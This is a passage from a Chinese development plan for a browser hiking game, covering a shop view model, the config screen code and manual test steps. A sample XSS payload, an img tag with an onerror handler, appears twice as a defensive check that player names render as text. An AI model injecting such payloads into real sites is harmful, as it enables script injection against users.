    if (t.总价 <= START_MONEY && t.总重 <= SHOP_CARRY_LIMIT) cart = 试
  }
  return cart
}

export function shopViewModel({ cart, 季节 }) {
  const 合计 = cartTotals(cart)
  const 剩余 = START_MONEY - 合计.总价
  const 已选ids = Object.keys(cart)

  const 分类映射 = new Map()
  for (const g of ALL_GEAR) {
    if (!分类映射.has(g.类别)) 分类映射.set(g.类别, [])
    const 当前档 = cart[g.id]
    const 最低价 = Math.min(...g.档次.map((t) => t.价格))
    const 已选 = !!当前档
    分类映射.get(g.类别).push({
      id: g.id,
      名称: g.名称,
      作用: g.作用 || '',
      季节: g.季节 || null,
      已选,
      当前档: 当前档 || null,
      档次: g.档次.map((t) => ({ 档: t.档, 价格: t.价格, 重量: t.重量, 选中: t.档 === 当前档 })),
      // 已经在车里的东西不算买不起——它的钱已经计进总价了
      买不起: !已选 && 最低价 > 剩余,
      还差: !已选 && 最低价 > 剩余 ? 最低价 - 剩余 : 0,
    })
  }

  const 缺件 = SHOP_ESSENTIALS.filter((id) => !cart[id]).map((id) => ({ id, 名称: getGear(id)?.名称 || id }))
  const 超重 = 合计.总重 > SHOP_CARRY_LIMIT
  const 超支 = 合计.总价 > START_MONEY

  return {
    分类: [...分类映射.entries()].map(([名称, 物品]) => ({ 名称, 物品 })),
    总价: 合计.总价,
    总重: 合计.总重,
    件数: 合计.件数,
    剩余,
    预算: START_MONEY,
    上限: SHOP_CARRY_LIMIT,
    超支,
    超重,
    超出重量: 超重 ? Math.round((合计.总重 - SHOP_CARRY_LIMIT) * 100) / 100 : 0,
    警告: gearWarnings(季节, 已选ids),
    缺件,
    可出发: 缺件.length === 0 && !超支 && !超重,
    背包: Object.entries(cart).map(([gearId, 档]) => ({ gearId, 档, 数量: 1 })),
  }
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/screen-shop.test.js`
Expected: PASS，18 个测试全绿。

**若「一键推荐配置」那条失败**，说明必备件的最低档合计已经超预算或超重——不要放宽断言，去看 `recommendedCart` 挑的档次，或回头核对 `gear.js` 的定价。这条断言存在的意义就是保证那个按钮不会坑玩家。

- [ ] **Step 5: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/screen-shop.js',`。

```bash
git add src/ui/screen-shop.js test/screen-shop.test.js build.mjs
git commit -m "feat: 商店视图模型，实时结算与季节警告

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## 阶段四 · 串联

### Task 13: 渲染层与准备流程

前面 12 个任务都是可测的纯逻辑，这一步把它们接上 DOM，串成一条能走通的流程：
**配置 API → 捏人 → 掷季节 → 抽卡 → 采购 → 出发**。

渲染层刻意做薄——它只负责把视图模型摆到屏幕上，不含任何判断逻辑。所有分支都已经在前面的视图模型里测过了。

**Files:**
- Create: `src/ui/app.js`
- Modify: `build.mjs`
- Test: 无自动化测试（DOM 层靠手动验证）

- [ ] **Step 1: 写 app.js**

`src/ui/app.js`。要点：

- 用 `el` / `setText` 构建界面，**一处都不许把变量拼进 innerHTML**（Task 5 的护栏会扫到）
- 每屏一个 `render` 函数，读视图模型、写 DOM
- 季节在捏人之后、抽卡之前掷定并公示（spec 第 10 节：玩家必须知道面对哪一季才能针对性备货）
- 采购确认后调 `createInitialState`，写自动存档，提示「计划三将接上徒步阶段」

骨架：

```js
import { el, setText, clear, $ } from './dom.js'
import { createRouter } from './router.js'
import { loadConfig, saveConfig, configViewModel } from './config.js'
import { createViewModel, randomDraft, deriveExperience } from './screen-create.js'
import { drawCompanions, drawViewModel } from './screen-draw.js'
import { shopViewModel, toggleItem, setTier, recommendedCart, START_MONEY } from './screen-shop.js'
import { rollSeason } from '../data/seasons.js'
import { makeRng } from '../engine/rng.js'
import { createInitialState } from '../engine/state.js'
import { createJournal } from '../engine/journal.js'
import { writeSave } from './save.js'

const 会话 = {
  种子: 0,
  config: null,
  draft: null,
  季节: null,
  队友: [],
  已重抽: 0,
  cart: {},
}

function 启动() {
  会话.种子 = Math.floor(Math.random() * 2 ** 31)
  会话.config = loadConfig(localStorage)
  会话.draft = randomDraft(makeRng(会话.种子))

  const router = createRouter((id) => document.getElementById('screen-' + id))
  router.register('config', { onEnter: () => renderConfig(router) })
  router.register('create', { onEnter: () => renderCreate(router) })
  router.register('draw', { onEnter: () => renderDraw(router) })
  router.register('shop', { onEnter: () => renderShop(router) })
  router.go('config')
}

if (typeof document !== 'undefined') 启动()
```

- [ ] **Step 1B: 按这个范本写四个 render**

下面是 `renderConfig` 的**完整实现**，其余三个照它的模式写：读视图模型 → `clear` 根节点 → 用 `el` 造节点 → 事件里改会话状态并重新 render。**通篇没有一处 `innerHTML`。**

```js
function renderConfig(router) {
  const root = document.getElementById('screen-config')
  const vm = configViewModel(会话.config)
  clear(root)

  const 预设选择 = el('select', {
    onchange: (e) => {
      // 换预设时清掉 baseURL 与 model，让 normalizeConfig 重新带出默认值
      会话.config = { ...会话.config, presetId: e.target.value, baseURL: '', model: '' }
      renderConfig(router)
    },
  }, vm.预设.map((p) => el('option', { value: p.id, selected: p.选中, text: p.名称 })))

  const key输入 = el('input', {
    type: 'password',
    placeholder: vm.key脱敏 || 'sk-...',
    oninput: (e) => { 会话.config = { ...会话.config, apiKey: e.target.value } },
  })

  const 模型输入 = el('input', {
    type: 'text',
    value: vm.config.model,
    oninput: (e) => { 会话.config = { ...会话.config, model: e.target.value } },
  })

  const baseURL输入 = el('input', {
    type: 'text',
    value: vm.config.baseURL,
    oninput: (e) => { 会话.config = { ...会话.config, baseURL: e.target.value } },
  })

  const 下一步 = el('button', {
    class: 'primary',
    disabled: !vm.可用,
    onclick: () => {
      saveConfig(localStorage, 会话.config)
      router.go('create')
    },
  }, ['下一步：捏人 →'])

  root.appendChild(el('h1', { text: '穿越鳌太线' }))
  root.appendChild(el('p', { class: 'muted', text: '接你自己的模型。key 只存在这台机器的浏览器里，不经过任何第三方。' }))

  const 面板 = el('div', { class: 'panel' }, [
    el('h2', { text: 'API 配置' }),
    el('label', { text: '厂商预设' }), 预设选择,
    el('label', { text: 'API key' }), key输入,
    el('label', { text: 'baseURL' }), baseURL输入,
    el('label', { text: '模型' }), 模型输入,
  ])

  if (vm.问题.length) {
    面板.appendChild(el('div', { class: 'notice warn' },
      vm.问题.map((x) => el('div', { text: '· ' + x }))))
  }

  面板.appendChild(el('div', { class: 'row', style: 'margin-top:12px' }, [下一步]))
  root.appendChild(面板)
}
```

**注意 `el('option', { text: p.名称 })`——名称走 `text` 属性（内部是 `textContent`），不是模板拼接。** 其余三屏同理：任何来自视图模型的字符串都只能经 `text:` 或 `setText` 落地。

`renderCreate` / `renderDraw` / `renderShop` 的结构：

- **renderCreate**：名字/职业/年龄/性别/外貌走 `input`；性格与技能走 `.tag` 元素，点击切换后重新 render；户外经验用 `.meter` 显示 `vm.户外经验`；「🎲 随机一个」调 `randomDraft(makeRng(Date.now()))`；「下一步」在 `vm.可继续` 为假时禁用，点击时掷季节（`rollSeason(makeRng(会话.种子))`）存进 `会话.季节`，再 `router.go('draw')`
- **renderDraw**：先显示公示的季节；两张卡片各用 `el('div', {class:'panel'})`，立绘用 `el('div')` 后 `节点.innerHTML = vm.卡片[i].立绘 // portrait-svg-safe`——**这是唯一允许的 innerHTML 例外，因为 `portraitSvg` 的输出是本地生成的静态 SVG、不含任何外部输入**，且 Task 9 有测试保证其中没有 `<script` 与 `on*=`；带伤的人状态用 `.danger` 色；重抽按钮在 `vm.可重抽` 为假时禁用
- **renderShop**：按 `vm.分类` 分组，每组一个 `.cat-head`；每项一行 `.item-row`，档次用 `.tag` 横排、点击调 `setTier`；买不起的行加 `.blocked` 并显示「还差 ¥N」；右侧结算栏用两个 `.meter`（花费用 `.warn`、负重接近上限用 `.danger`）、`vm.警告` 逐条 `.notice.warn`、`vm.缺件` 逐条列出；「一键推荐」调 `recommendedCart(会话.季节)`；「确认出发」在 `vm.可出发` 为假时禁用


- [ ] **Step 2: 构建并在浏览器里手动验证**

Run: `npm run build`，然后 `open dist/穿越鳌太线.html`

逐项确认，**每一项都要真的点一遍**：

| 项 | 期望 |
|---|---|
| API 配置 | 切换预设时 baseURL 与模型跟着变；key 输入后只显示脱敏值；没填 key 时「下一步」禁用 |
| 捏人 | 改职业/技能/年龄，户外经验实时变；技能选满 3 个后不能再选；「随机一个」出来的必定合法 |
| 季节 | 捏完人公示季节，且在采购之前 |
| 抽卡 | 两张卡带占位立绘、技能、状态；带伤的人状态标红；重抽仅一次，用完按钮禁用 |
| 商店 | 点档位实时改总价总重；两条进度条随之动；买不起的标红写「还差 ¥N」；冬季不带冰爪时出警告；缺件清单实时更新；「一键推荐」点完直接可出发 |
| 出发 | 写入自动存档；刷新页面后存档还在 |
| 安全 | 名字填 `<img src=x onerror=alert(1)>`，走完流程，**不能弹窗**——应原样显示为文本 |

最后一项是 Task 5 那条约束的实地验证，**必须真的试**。

- [ ] **Step 3: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/app.js',`（它依赖前面所有 ui 模块，必须最后）。

Run: `npm test` → 全绿；`npm run build` → 成功

```bash
git add src/ui/app.js build.mjs
git commit -m "feat: 准备阶段流程串联，配置到出发走通

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## 验收标准

- [ ] `npm test` 全绿，新增测试不少于 90 条
- [ ] `npm run build` 产出单文件，双击可开，无控制台报错
- [ ] 走通 配置 → 捏人 → 季节 → 抽卡 → 采购 → 出发，自动存档写入且刷新后仍在
- [ ] 名字填入 `<img src=x onerror=alert(1)>` 不弹窗，原样显示为文本
- [ ] 冬季连续三夜不带睡袋，`checkEnding` 返回「失败遇险」
- [ ] `src/ui` 下没有任何模块把变量拼进 `innerHTML`（护栏测试保证）

## 不在本计划范围

主界面（双栏仪表盘 + 立绘舞台 + 剧情流 + 选项区）、结局页、徒步阶段的回合循环——全部留给计划三。本计划完成时，点「出发」会提示「计划三将接上徒步阶段」。


---

## 留给计划三的两条

**1. `textContent` 会吃掉换行——LLM 正文的分段会消失。**

`src/styles.css` 里没有任何 `white-space` 规则，默认 `normal` 会把 `\n` 折叠成空格。直接 `setText(节点, 剧情)` 会让「段落一\n\n段落二」渲染成「段落一 段落二」。

正确做法不是退回 `innerHTML`，而是按 `\n\n` 切段，每段一个 `el('p')` + `setText`，全程留在 `textContent` 里。或者给剧情容器加 `white-space: pre-wrap`。

**2. `isHarshWeather` 与 `sleep()` 还没接上。**

Task 3 定义了 `isHarshWeather(state.weather)`（等级 ≥6 即恶劣），但 `sleep(state, { 恶劣天气 })` 仍要调用方自己传，而 `turn.js` 目前**根本没有调用 `sleep()`**——夜间阶段还没做。

计划三接主循环时必须把这条接上：`sleep(state, { 恶劣天气: isHarshWeather(state.weather) })`。忘了接，`isHarshWeather` 就是第三个死代码（前两个是 `失温连败` 和 `party.js`，都是这样被发现的）。
